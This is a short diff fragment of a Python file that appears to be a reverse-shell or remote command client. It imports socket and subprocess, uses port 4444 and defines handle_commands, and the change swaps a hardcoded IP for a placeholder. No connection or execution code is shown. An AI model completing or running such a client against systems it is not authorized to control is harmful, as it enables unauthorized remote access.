@@ -3,7 +3,7 @@ import socket
 import subprocess
 import threading
 
-SERVER_IP = "10.0.35.243"
+SERVER_IP = "your ip"
 PORT = 4444
 
 def handle_commands(sock):
